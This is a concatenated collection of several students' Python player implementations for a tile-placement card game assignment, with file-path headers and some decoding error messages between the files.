                for c in range(len(newCardOnDesk[2][0])):
                    self.volksgemeinschaft[r+newCardOnDesk[0]][c+newCardOnDesk[1]] = newCardOnDesk[2][r][c]
        elif len(newCardOnDesk) == 0 and not self.started:
            for card_play in self.cardsAtHand:
                if len(card_play) <= len(self.volksgemeinschaft)-1 and len(card_play[0]) <= len(self.volksgemeinschaft):
                    for r in range(len(card_play)):
                        for c in range(len(card_play[0])):
                            self.volksgemeinschaft[r][c] = card_play[r][c]
                    self.cardsAtHand.remove(card_play)
                    self.cardsOnDesk += [ [0, 0, card_play] ]
                    self.started = True
                    return [0, 0, card_play]
                
        self.started = True

        if len(self.cardsAtHand) == 0:
            return []

        max_card_value = [-1, -1, -1, [], []]

        for card_ref in self.cardsAtHand:
            card_matrix = card_ref

            for _ in range(4):
                for placed_card in self.cardsOnDesk:
                    
                    for position_r in range(placed_card[0]-len(card_matrix)+1, placed_card[0]+len(placed_card[2])):
                        position_c = placed_card[1]-len(card_matrix[0])
                        max_card_value = self.max_value(max_card_value, self.evaluate_card_placement(position_r, position_c, card_matrix, self.volksgemeinschaft), card_matrix, position_r, position_c, card_ref)

                        position_c =  placed_card[1]+len(placed_card[2][0])
                        max_card_value = self.max_value(max_card_value, self.evaluate_card_placement(position_r, position_c, card_matrix, self.volksgemeinschaft), card_matrix, position_r, position_c, card_ref)
                    
                    for position_c in range(placed_card[1]-len(card_matrix[0])+1, placed_card[1]+len(placed_card[2][0])):
                        position_r = placed_card[0]-len(card_matrix)
                        max_card_value = self.max_value(max_card_value, self.evaluate_card_placement(position_r, position_c, card_matrix, self.volksgemeinschaft), card_matrix, position_r, position_c, card_ref)

                        position_r = placed_card[0]+len(placed_card[2])
                        max_card_value = self.max_value(max_card_value, self.evaluate_card_placement(position_r, position_c, card_matrix, self.volksgemeinschaft), card_matrix, position_r, position_c, card_ref)

                card_matrix = self.rotate_matrix_clockwise(card_matrix)
        
        if len(max_card_value[-1]) == 0:
            return []
        else:
            self.cardsOnDesk += [ [max_card_value[1], max_card_value[2], max_card_value[3]] ]
            for r in range(len(max_card_value[3])):
                for c in range(len(max_card_value[3][0])):
                    self.volksgemeinschaft[r+max_card_value[1]][c+max_card_value[2]] = max_card_value[3][r][c]
            self.cardsAtHand.remove(max_card_value[4]) # need to keep reference of og card not rotated
            return [max_card_value[1], max_card_value[2], max_card_value[3]]
        
    
    def max_value(self, max_card, evaluated_card_value, evaluated_card, position_r, position_c, evaluated_card_ref):
        if evaluated_card_value > max_card[0]:
            return [evaluated_card_value, position_r, position_c, evaluated_card, evaluated_card_ref]
        return max_card

    def evaluate_card_placement(self, card_coord_r, card_coord_c, card_matrix, matrix):
        placement_value = -1
        collision = False
        for i in range(len(card_matrix)):
                for j in range(len(card_matrix[0])):
                    if card_coord_r < 0 or card_coord_c < 0 or card_coord_r+i > len(matrix)-1 or card_coord_c+j > len(matrix[0])-1:
                        collision = True
                        break
                    elif matrix[card_coord_r+i][card_coord_c+j] != -1:
                        collision = True
                        break
        
        if not collision:
            placement_value = 0
            coords_list = []
            key = 0
            for ii in range(len(card_matrix)):
                for jj in range(len(card_matrix[0])):
                    key = card_matrix[ii][jj]
                    if key > 0:
                        was_outside = [False]
                        value = self.recursive_path(card_matrix[ii][jj], [card_coord_r+ii, card_coord_c+jj], matrix, card_matrix, (card_coord_r, card_coord_c), coords_list, was_outside)
                        if value > 0 and was_outside[0]:
                            placement_value += value 
        return placement_value
    
    def recursive_path(self, key, coords, matrix, card, card_coords, coords_list, was_outside):
        if coords in coords_list:
            return 0
        if coords[0] < 0 or coords[1] < 0 or coords[0] > len(matrix)-1 or coords[1] > len(matrix[0])-1:
            return 0
        if coords[0] > card_coords[0]-1 and coords[1] > card_coords[1]-1 and coords[0] < card_coords[0]+len(card) and coords[1] < card_coords[1]+len(card[0]):
            if card[coords[0]-card_coords[0]][coords[1]-card_coords[1]] != key:
                return 0
        else:
            if matrix[coords[0]][coords[1]] != key:
                return 0
            else:
                was_outside[0] = True

        coords_list.append(coords[:])
        
        top = self.recursive_path(key, [coords[0]-1, coords[1]], matrix, card, card_coords, coords_list, was_outside)
        bottom = self.recursive_path(key, [coords[0]+1, coords[1]], matrix, card, card_coords, coords_list, was_outside)
        left = self.recursive_path(key, [coords[0], coords[1]-1], matrix, card, card_coords, coords_list, was_outside)
        right = self.recursive_path(key, [coords[0], coords[1]+1], matrix, card, card_coords, coords_list, was_outside)

        return 1 + top + bottom + left + right
    
    def rotate_matrix_clockwise(self, matrix):
        return [[matrix[r][c] for r in range(len(matrix)-1, -1, -1)] for c in range(len(matrix[0]))]    michaj32
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/michaj32______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw

# all the sizes and positions are Row and Column
class Card:
    def __init__(self, position, size, data):
        self.position = position
        self.size = size
        self.data = data
        self.colors = self.get_colors()

    def rotate_cclockwise(self):
        R, C = self.size
        new_data = []

        for col in range(C):
            temp = []
            for row in range(R):
                temp.append(self.data[row][-col -1])
            new_data.append(temp)
        self.data = new_data
        self.size = [C, R]

    # Getting the edge position of colors, to know where they are located
    def get_color_pos(self):
        R, C = self.size

        # Add key values to dictionary "positions"
        positions = {}
        for color in self.colors:
            positions[color] = []

        # Loop only around the edges
        for row in range(R):
            for col in range(C):
                if (row != 0) and (row != R - 1) and (col != 0) and (col != C - 1):
                    continue

                # Everything that is being checked here is only around the edges
                if self.data[row][col] in self.colors:
                    positions[self.data[row][col]].append([row, col])
        return positions

    # Getting colors that are on card, relative to the card
    def get_colors(self):
        R, C = self.size
        colors = []
        for r in range(R):
            for c in range(C):
                if (self.data[r][c] not in colors) and (self.data[r][c] != 0):
                    colors.append(self.data[r][c])
        colors.sort()
        return colors
    
    # Printing card data
    def __str__(self):
        R, C = self.size
        out = ""
        for r in range(R):
            for c in range(C):
                out += str(self.data[r][c]) + " "
            out += "\n"
        return out

# Probably uselless
class Board:
    

    def __init__(self, size):
        self.size = size
        self.board = self.generate_board()
        self.static_cards = []
        self.player_cards = []

    def generate_board(self):
        R, C = self.size
        board = []
        for i in range(R):
            board.append([0] * C)
        return board
    
    def measure_path(self):
        card = self.player_cards[-1]
        mr, mc = card.position
        mR, mC = card.size

        visited = []
        length_sum = 0

        # Go through all edge positions on the card and then sum all the paths that got out of the bounds of the card => they were connected to other card
        poses = card.get_color_pos()
        for color in card.colors:
            for pos in poses[color]:
                start_pos = [pos[0] + mr, pos[1] + mc]
                stack = [start_pos]
                outside_card = False
                length = 0

                while stack != []:
                    r, c = stack.pop()

                    # Algorithm already visited this position 
                    if [r, c] in visited:
                        continue

                    # The point is outside this card, which means that it is measuring
                    # newly created path
                    if (r > (mr + mR) - 1) or (c > (mc + mC) - 1) or (r < mr) or (c < mc):
                        outside_card = True

                    if r != 0 and self.board[r-1][c] == color:
                        stack.append([r-1, c])
                    if c != 0 and self.board[r][c-1] == color:
                        stack.append([r, c-1])
                    if r != self.size[0] -1 and self.board[r+1][c] == color:
                        stack.append([r+1, c])
                    if c != self.size[1] -1 and self.board[r][c+1] == color:
                        stack.append([r, c+1])

                    length += 1
                    visited.append([r,c])
                
                if not outside_card:
                    length = 0

                length_sum += length    

        return length_sum

    def insert_static_card(self, card):
        # checking if the card is not out of the game board
        if (card.position[0] + card.size[0] > self.size[0]) or (card.position[1] + card.size[1] > self.size[1]):
            return False
        
        # appending the card array
        self.static_cards.append(card)

        # adding the card on the board
        r, c = card.position
        R, C = card.size
        for row in range(R):
            for col in range(C):
                self.board[r + row][c + col] = card.data[row][col]

    def insert_player_card(self, card):
        # checking if the card is not out of the game board
        if (card.position[0] + card.size[0] > self.size[0]) or (card.position[1] + card.size[1] > self.size[1]) or (card.position[0] < 0) or (card.position[1] < 0):
            return False

        r, c = card.position
        R, C = card.size

        # checking if the card doesnt collide with any other card - it works
        for p_card in self.static_cards:
            pr, pc = p_card.position
            pR, pC = p_card.size

            if ((r + R) - 1 >= pr) and (r <= (pr + pR) - 1) and ((c + C) - 1 >= pc) and (c <= (pc - 1) + pC):    # The cards are colliding
                return False

        self.player_cards.append(card)

        for row in range(R):
            for col in range(C):
                self.board[r + row][c + col] = card.data[row][col]

        return True
    
    def remove_player_card(self, card):
        # Remove the card from list
        self.player_cards.remove(card)

        # Fill board with 0 on the place of the card
        r, c = card.position
        R, C = card.size
        for row in range(R):
            for col in range(C):
                self.board[r + row][c + col] = 0

    # printing the board
    def __str__(self):
        R, C = self.size
        out = ""
        for r in range(R):
            for c in range(C):
                out += str(self.board[r][c]) + " "
            out += "\n"
        return out

#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

unconnectable = [ [0,3,0],
                  [3,3,0],
                  [3,0,0],
                  [3,3,3]]

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Stream of Consciousness"

        # Setting up board
        self.game_board = Board([self.boardRows, self.boardCols])

        # Setting up cards
        #random.shuffle(self.cardsAtHand)
        #random.seed()
        self.myCards = []
        self.placedCards = []
        for card in self.cardsAtHand:
            self.myCards.append(Card(None, [len(card), len(card[0])], card))

    def play(self,newCardOnDesk):
        if len(newCardOnDesk) == 3:
            card = Card([newCardOnDesk[0], newCardOnDesk[1]], [len(newCardOnDesk[2]), len(newCardOnDesk[2][0])], newCardOnDesk[2])
            self.cardsOnDesk += [newCardOnDesk]
            self.placedCards.append(card)
            self.game_board.insert_static_card(card)

        if len(self.cardsAtHand) == 0:
            return []

        def return_Data(index, ret_card):
            # Remove my card
            self.cardsAtHand = self.cardsAtHand[:index] + self.cardsAtHand[index+1:]
            self.myCards = self.myCards[:index] + self.myCards[index+1:]

            # Inserting card on the board
            self.game_board.insert_static_card(ret_card)
            self.placedCards.append(ret_card)
            r, c = ret_card.position
            data = ret_card.data

            self.cardsOnDesk += [[r,c,data]]
            return [r,c,data]

        # First move, no cards are placed yet
        if len(self.cardsOnDesk) == 0:
            cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
            card = self.cardsAtHand[cardindx]
            cardRows = len(card)
            cardCols = len(card[0])
            row = random.randint(0, self.boardRows-cardRows-1) 
            col = random.randint(0, self.boardCols-cardCols-1)

            placing_card = Card([row, col], [cardRows, cardCols], card)
            return_Data(cardindx, placing_card)

            return [row, col, card ]   

        # Loading placed and playable cards
        longest_len = 0
        temp_card = None
        cardindx = None

        # Looping through my cards
        for index, card in enumerate(self.myCards):
            for i in range(4):  # Rotating the card to check all the variations
                #print(card)
                # Lgic for finding the best place for that card
                R, C = card.size
                card_poses = card.get_color_pos()

                # Looping through all placed cards edge color positions, wich are on my playable card
                for key, value in card_poses.items():
                    # look for the same keys in the placed cards
                    for placed_card in self.placedCards:
                        placed_c_c_pos = placed_card.get_color_pos()
                        if key not in placed_c_c_pos:
                            continue

                        placed_poses = placed_c_c_pos[key]
                        # Now that I know the pos of the colors, try to put the card there
                        for p_pos in placed_poses:
                            pR, pC = placed_card.size
                            pr, pc = placed_card.position

                            # Also loop through all of my card positions which can be connected
                            for my_pos in value:
                                placed = False
                                if (p_pos[0] == 0) and (my_pos[0] == R - 1): # On the top, also checks if my card can be connected from the bottom
                                    # Calculate the card position to actually connect those colors
                                    card.position = [pr - R, pc + p_pos[1] - my_pos[1]]
                                    #print("from top", card.position)
                                    placed = self.game_board.insert_player_card(card)

                                elif (p_pos[0] == pR - 1) and (my_pos[0] == 0): # On the bottom, and card on the top
                                    # Calculate the card position to actually connect those colors
                                    card.position = [pr + pR, pc + p_pos[1] - my_pos[1]]
                                    #print("from bottom:", card.position)
                                    placed = self.game_board.insert_player_card(card)

                                elif (p_pos[1] == 0) and (my_pos[1] == C - 1): # On the left, and card on the right   
                                    # Calculate the card position to actually connect those colors
                                    card.position = [pr + p_pos[0] - my_pos[0], pc - C]
                                    #print("from left:", card.position)
                                    placed = self.game_board.insert_player_card(card)

                                elif (p_pos[1] == pC - 1) and (my_pos[1] == 0): # On the right, and card on the left
                                    # Calculate the card position to actually connect those colors
                                    card.position = [pr + p_pos[0] - my_pos[0], pc + pC]
                                    #print("from right:", card.position)
                                    placed = self.game_board.insert_player_card(card)

                                # Measure the longest path
                                if placed:
                                    length = self.game_board.measure_path()
                                    #print(length)
                                    #print(game_board)
                                    if length > longest_len:
                                        longest_len = length
                                        temp_card = copy.deepcopy(card)
                                        cardindx = index
                                    self.game_board.remove_player_card(card)
                                    #print(game_board)
                                
                # rotate the card
                card.rotate_cclockwise()

        if longest_len == 0:
            # Then just slap any card somewhere if possible
            # Looping through my cards
            for index, card in enumerate(self.myCards):
                sides = 1
                if card.size[0] != card.size[1]:
                    sides = 2
                
                for i in range(sides):  # Rotating the card to check all the variations
                    R, C = card.size

                    for placed_card in self.placedCards:
                        pR, pC = placed_card.size
                        pr, pc = placed_card.position

                        # Try placing card around the placed card
                        # Generating all positions where the card could theoretically be placed
                        poses = []
                        for col in range(pc - (C - 1), pc + pC):
                            poses.append([pr - R, col])
                            poses.append([pr + pR, col])
                        for row in range(pr - (R - 1), pr + pR):
                            poses.append([row, pc - C])
                            poses.append([row, pc + pC])

                        # placing it there
                        for pos in poses: 
                            card.position = pos
                            if self.game_board.insert_player_card(card):
                                self.game_board.remove_player_card(card)
                                temp_card = copy.deepcopy(card)
                                return return_Data(index, temp_card)

                    card.rotate_cclockwise()

            # No cards found
            return []
                        
        else:
            #print(longest_len)
            #print(temp_card.position)
            #print(temp_card)
            #print(self.game_board)
            return return_Data(cardindx, temp_card)

if __name__ == "__main__":
    tmp = [C44a, C44b, C33a,C33c, C53c, C53b, unconnectable]*1

    p1 = Player("testA", 17, 25, tmp)
    p2 = Player("testB", 17, 25, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()
    berand10
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/berand10______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
A1 = [[4, 1, 4, 2, 3], [1, 1, 4, 2, 2], [2, 1, 4, 2, 1]]
A2 = [[4, 1, 4, 2], [1, 1, 4, 4], [4, 4, 1, 1], [2, 4, 1, 4]]
A3 = [[1, 4, 1, 3, 2], [4, 4, 1, 3, 3], [3, 4, 1, 3, 4]]
A4 = [[4, 3, 4, 2], [3, 3, 4, 4], [4, 4, 3, 3], [2, 4, 3, 4]]
A5 = [[4, 3, 4, 1, 2], [3, 3, 4, 1, 1], [1, 3, 4, 1, 3]]
A6 = [[2, 3, 2, 1], [3, 3, 2, 2], [2, 2, 3, 3], [1, 2, 3, 2]]
A7 = [[3, 1, 3, 4, 2], [1, 1, 3, 4, 4], [4, 1, 3, 4, 1]]
A8 = [[4, 2, 4, 1, 3], [2, 2, 4, 1, 1], [1, 2, 4, 1, 2]]
A9 = [[4, 1, 4, 3], [1, 1, 4, 4], [4, 4, 1, 1], [3, 4, 1, 4]]
A10 = [[1, 4, 1, 2], [4, 4, 1, 1], [1, 1, 4, 4], [2, 1, 4, 1]]
A11 = [[1, 3, 1, 2, 4], [3, 3, 1, 2, 2], [2, 3, 1, 2, 3]]
A12 = [[2, 3, 2, 1, 4], [3, 3, 2, 1, 1], [1, 3, 2, 1, 3]]
A13 = [[3, 1, 3, 4], [1, 1, 3, 3], [3, 3, 1, 1], [4, 3, 1, 3]]
A14 = [[1, 2, 1, 4, 3], [2, 2, 1, 4, 4], [4, 2, 1, 4, 2]]
A15 = [[2, 4, 2, 3], [4, 4, 2, 2], [2, 2, 4, 4], [3, 2, 4, 2]]
A16 = [[3, 4, 3, 1, 2], [4, 4, 3, 1, 1], [1, 4, 3, 1, 4]]
A17 = [[3, 4, 3, 2], [4, 4, 3, 3], [3, 3, 4, 4], [2, 3, 4, 3]]
A18 = [[3, 4, 3, 1], [4, 4, 3, 3], [3, 3, 4, 4], [1, 3, 4, 3]]
A19 = [[3, 2, 3, 1], [2, 2, 3, 3], [3, 3, 2, 2], [1, 3, 2, 3]]
A20 = [[3, 2, 3, 1, 4], [2, 2, 3, 1, 1], [1, 2, 3, 1, 2]]
A21 = [[1, 3, 1, 4, 2], [3, 3, 1, 4, 4], [4, 3, 1, 4, 3]]
A22 = [[2, 1, 2, 3, 4], [1, 1, 2, 3, 3], [3, 1, 2, 3, 1]]
A23 = [[3, 1, 3, 2, 4], [1, 1, 3, 2, 2], [2, 1, 3, 2, 1]]

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "DaG2"


    def play(self,newCardOnDesk):
        t1 = time.time()
        if newCardOnDesk!=[]:self.cardsOnDesk.append(newCardOnDesk)
        def hracipole(self):
            
            pole,x =[], -1
            for i in range(self.boardRows):
                radka = []
                for f in range(self.boardCols): radka.append(x)
                pole.append(radka)
            if len(self.cardsOnDesk) == 0:return pole
            else:
                for i in self.cardsOnDesk:
                    if i == []:pass
                    radek, sloupec = i[0], i[1] 
                    for f in range(len(i[2])):
                        for p in range(len(i[2][0])):
                            pole[radek+f][sloupec+p ] = i[2][f][p]
                
                return pole
        pole = hracipole(self)
        if len(self.cardsOnDesk) == 0: 
            node=self.cardsAtHand.pop(0)
            self.cardsOnDesk.append([0,0,node])
            return[0,0,node]
        else:
            def blizko(pole, karta, a, b): 
                for i in range(a, a + len(karta)):
                    for f in range(b, b + len(karta[0])):
                        if i == a and i - 1 > -1 and pole[i-1][f] != -1: return True
                        if i == a + len(karta) - 1 and a  + len(karta) < len(pole) and pole[i+1][f] != -1 : return True
                        if f == b and f - 1 > -1 and pole[i][f-1] != -1: return True
                        if f == b + len(karta[0])-1 and b + len(karta[0]) < len(pole[0]) and pole[i][f+1] != -1: return True
                return False
            def rotace(karta):
                rotmat =  [[0 for _ in range(len(karta))] for _ in range(len(karta[0]))]
                for i in range(len(karta[0])):
                    for f in range(len(karta)):
                        rotmat[i][f] = karta[len(karta)-1-f][i]
                return rotmat 
            def possible(a,b,kar,arr):
                if blizko(arr,kar, a,b):
                    for i in range(a, a + len(kar) ):
                        for f in range(b,b + len(kar[0])  ):
                            if arr[i][f] != -1 : return False       
                    return True
                return False
            
            def mojekarty(self, arr):
                vsechnyreseni = []
                #t1 = time.time()
                if len(self.cardsAtHand) < 15:
                    for line in self.cardsAtHand:
                        rotmat = rotace(line)
                        if len(vsechnyreseni) > 1000: break
                        rotrotmat = rotace(rotmat)
                        if len(line) == len(line[0]) and rotrotmat == line and rotmat == line:
                            for i in range(len(arr)- len(line)+1):
                                for f in range(len(arr[0]) - len(line[0])+1):
                                    if possible(i,f,line,arr):
                                        vsechnyreseni.append([i,f,line,line])
                        elif len(line) == len(line[0]) and rotrotmat == line:    
                            for i in range(len(arr)- len(line)+1):
                                for f in range(len(arr[0]) - len(line[0])+1):
                                    if possible(i,f,line,arr):
                                        vsechnyreseni.append([i,f,line,line])
                                        vsechnyreseni.append([i,f,rotmat, line])
                        elif rotrotmat == line:                            
                            for i in range(len(arr)- len(line)+1):
                                for f in range(len(arr[0]) - len(line[0])+1):
                                    if possible(i,f,line,arr):
                                        vsechnyreseni.append([i,f,line,line])
                            for s in range(len(arr)+1 - len(rotmat)):
                                for z in range(len(arr[0])+1 - len(rotmat[0])):
                                    if possible(s,z,rotmat,arr):
                                        vsechnyreseni.append([s,z,rotmat,line])
                        elif len(line) == len(line[0]):
                            for i in range(len(arr)- len(line)+1):
                                for f in range(len(arr[0]) - len(line[0])+1):
                                    if possible(i,f,line,arr):
                                        vsechnyreseni.append([i,f,line,line])
                                        vsechnyreseni.append([i,f,rotmat,line])
                                        vsechnyreseni.append([i,f,rotrotmat,line])
                                        vsechnyreseni.append([i,f,rotace(rotrotmat),line])
                        else:
                                for i in range(len(arr)- len(line)+1):
                                    for f in range(len(arr[0]) - len(line[0])+1):
                                        pravda = possible(i,f,line,arr)
                                        if pravda:
                                            vsechnyreseni.append([i,f,line,line])
                                            vsechnyreseni.append([i,f,rotrotmat,line])
                                for s in range(len(arr)+1 - len(rotmat)):
                                    for z in range(len(arr[0])+1 - len(rotmat[0])):
                                        pravda = possible(s,z,rotmat,arr) 
                                        if pravda:
                                            vsechnyreseni.append([s,z,rotmat,line])
                                            vsechnyreseni.append([s,z,rotace(rotrotmat),line])  
                else:   #!!!!!!!!!!!!!!!!!!!!!!!!!!!
                        for line in self.cardsAtHand:
                            rotmat = rotace(line)
                            if len(vsechnyreseni) > 1000: break
                            rotrotmat = rotace(rotmat)
                            if len(line) == len(line[0]) and rotrotmat == line:      
                                for i in range(len(arr)- len(line)+1):
                                    for f in range(len(arr[0]) - len(line[0])+1):
                                        if possible(i,f,line,arr):
                                            vsechnyreseni.append([i,f,line,line])
                            elif rotrotmat == line:                            
                                for i in range(len(arr)- len(line)+1):
                                    for f in range(len(arr[0]) - len(line[0])+1):
                                        if possible(i,f,line,arr):
                                            vsechnyreseni.append([i,f,line,line])
                                for s in range(len(arr)+1 - len(rotmat)):
                                    for z in range(len(arr[0])+1 - len(rotmat[0])):
                                        if possible(s,z,rotmat,arr):
                                            vsechnyreseni.append([s,z,rotmat,line])
                            elif len(line) == len(line[0]):
                                for i in range(len(arr)- len(line)+1):
                                    for f in range(len(arr[0]) - len(line[0])+1):
                                        if possible(i,f,line,arr):
                                            vsechnyreseni.append([i,f,line,line])
                                            vsechnyreseni.append([i,f,rotmat,line])
                            else:
                                    for i in range(len(arr)- len(line)+1):
                                        for f in range(len(arr[0]) - len(line[0])+1):
                                            pravda = possible(i,f,line,arr)
                                            if pravda:
                                                vsechnyreseni.append([i,f,line,line])
                                    for s in range(len(arr)+1 - len(rotmat)):
                                        for z in range(len(arr[0])+1 - len(rotmat[0])):
                                            pravda = possible(s,z,rotmat,arr) 
                                            if pravda:
                                                vsechnyreseni.append([s,z,rotmat,line]) 


                    #t2 = time.time()
                    #print(t2-t1)
                    
                if len(vsechnyreseni) > 0: return nejvicbodu(vsechnyreseni,arr)
                return []
            def nejvicbodu(a,arr):
                best = float('-inf')
                for i in range(len(a)):
                    current = polozitkartu(a[i],arr)
                    if current > best: 
                        best,reseni = current,a[i]

                self.cardsAtHand.remove(reseni[3])
                
                return reseni
            
            def polozitkartu(a,arr):
                index1,index2,radky,sloupce = a[0],a[1],len(a[2]),len(a[2][0])
                b = copy.deepcopy(arr)
                for i in range(radky):
                    for f in range(sloupce):
                        b[index1+i][index2+f] = a[2][i][f]
                return spocitejkomponenty(b, index1,index2,radky,sloupce)
            def spocitejkomponenty(arr, index1,index2,radky,sloupce):
                stack = []
                for i in range(index1,index1 + radky):
                    for f in range(index2, index2 + sloupce):
                        if arr[i][f] != 0:
                            if (i == index1 and i>0 and arr[i-1][f] == arr[i][f]) and [i,f] not in stack:
                                stack.append([i,f])
                                probod(i,f,stack, arr)
                            if(i+1<len(arr) and i == index1 + radky-1 and  arr[i+1][f] == arr[i][f])and [i,f] not in stack:
                                stack.append([i,f])    
                                probod(i,f,stack, arr)
                            if (f == index2 and f>0 and arr[i][f-1] == arr[i][f]) and [i,f] not in stack:
                                stack.append([i,f])
                                probod(i,f,stack, arr)
                            if (f+1<len(arr[0]) and f == index2+sloupce-1 and arr[i][f+1] == arr[i][f]) and [i,f] not in stack:
                                stack.append([i,f])            
                                probod(i,f,stack, arr)
                return len(stack)
            def probod(index1,index2,zasobnik, arr):
                if  index1 + 1< len(arr) and arr[index1 + 1][index2]==arr[index1][index2] and [index1+1,index2] not in zasobnik:
                    zasobnik.append([index1+1,index2])
                    probod(index1+1,index2,zasobnik,arr)
                if arr[index1 - 1][index2 ]==arr[index1][index2] and index1 - 1 >  -1 and [index1-1,index2] not in zasobnik :  
                    zasobnik.append([index1-1,index2])
                    probod(index1-1,index2,zasobnik,arr)
                if index2 + 1< len(arr[0]) and arr[index1][index2 +1]==arr[index1][index2]   and [index1,index2+1] not in zasobnik :
                    zasobnik.append([index1,index2+1])
                    probod(index1,index2+1,zasobnik,arr)
                if arr[index1 ][index2 -1]==arr[index1][index2] and index2 -1>-1 and [index1,index2-1] not in zasobnik:    
                    zasobnik.append([index1,index2-1])
                    probod(index1,index2-1,zasobnik,arr)
                return zasobnik
            s = (mojekarty(self,pole))
            if s != []:self.cardsOnDesk.append(s[:3])
            t2 = time.time()
            print(t2 - t1)
            return s[:3]


                                   


        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made   
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position




if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [A1, A2, A3, A4, A5, A6, A7, A8, A9, A10, A11, A12, A13, A14, A15, A16, A17, A18, A19, A20, A21, A22, A23]*2

    p1 = Player("testA", 40, 40, tmp)
    p2 = Player("testB", 40, 40, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    krausste
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/krausste______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 14412: ordinal not in range(128)    vachasim
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/vachasim______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 20111: ordinal not in range(128)    tyfamart
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/tyfamart______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 7413: ordinal not in range(128)        cards_easy.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 162: ordinal not in range(128)    blazejo6
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/blazejo6______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
A1 = [[1, 3, 1, 2, 4], [3, 3, 1, 2, 2], [2, 3, 1, 2, 3]]
A2=  [[1, 4, 1, 3, 2], [4, 4, 1, 3, 3], [3, 4, 1, 3, 4]]
A3 = [[2, 1, 2, 4, 3], [1, 1, 2, 4, 4], [4, 1, 2, 4, 1]]
A4= [[4, 1, 4, 3], [1, 1, 4, 4], [4, 4, 1, 1], [3, 4, 1, 4]]
A5= [[1, 2, 1, 4], [2, 2, 1, 1], [1, 1, 2, 2], [4, 1, 2, 1]]
A6= [[2, 1, 2, 3, 4], [1, 1, 2, 3, 3], [3, 1, 2, 3, 1]]
A7= [[2, 1, 2, 3], [1, 1, 2, 2], [2, 2, 1, 1], [3, 2, 1, 2]]
A8= [[1, 3, 1, 4], [3, 3, 1, 1], [1, 1, 3, 3], [4, 1, 3, 1]]
A9= [[2, 4, 2, 3], [4, 4, 2, 2], [2, 2, 4, 4], [3, 2, 4, 2]]
A10= [[4, 2, 4, 3, 1], [2, 2, 4, 3, 3], [3, 2, 4, 3, 2]]
A11= [[4, 2, 4, 1], [2, 2, 4, 4], [4, 4, 2, 2], [1, 4, 2, 4]]
A12= [[4, 1, 4, 2, 3], [1, 1, 4, 2, 2], [2, 1, 4, 2, 1]]
A13= [[4, 3, 4, 1], [3, 3, 4, 4], [4, 4, 3, 3], [1, 4, 3, 4]]
A14= [[1, 4, 1, 2, 3], [4, 4, 1, 2, 2], [2, 4, 1, 2, 4]]
A15= [[2, 4, 2, 3, 1], [4, 4, 2, 3, 3], [3, 4, 2, 3, 4]]
A16= [[3, 1, 3, 2, 4], [1, 1, 3, 2, 2], [2, 1, 3, 2, 1]]
A17= [[3, 4, 3, 1, 2], [4, 4, 3, 1, 1], [1, 4, 3, 1, 4]]
A18= [[4, 2, 4, 1, 3], [2, 2, 4, 1, 1], [1, 2, 4, 1, 2]]
A19= [[4, 2, 4, 3], [2, 2, 4, 4], [4, 4, 2, 2], [3, 4, 2, 4]]
